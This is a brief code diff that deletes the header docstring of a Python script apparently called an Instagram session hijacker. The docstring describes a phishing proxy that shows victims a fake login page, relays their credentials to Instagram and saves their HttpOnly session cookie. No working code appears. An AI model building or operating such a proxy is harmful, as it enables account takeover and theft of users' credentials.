@@ -1,18 +1,3 @@
-#!/usr/bin/env python3
-"""
-Instagram Session Hijacker v5 - Raw Header Capture Proxy
-Authorized Penetration Testing Only
-
-This proxy captures ALL raw HTTP response headers from Instagram,
-including the HttpOnly sessionid cookie that JavaScript cannot access.
-
-The proxy:
-1. Serves a login page to the victim
-2. Forwards their credentials to Instagram's REAL API
-3. Captures the raw Set-Cookie headers from Instagram's response
-4. Saves the sessionid to your laptop
-"""
-
 import urllib3
 import os
 import sys
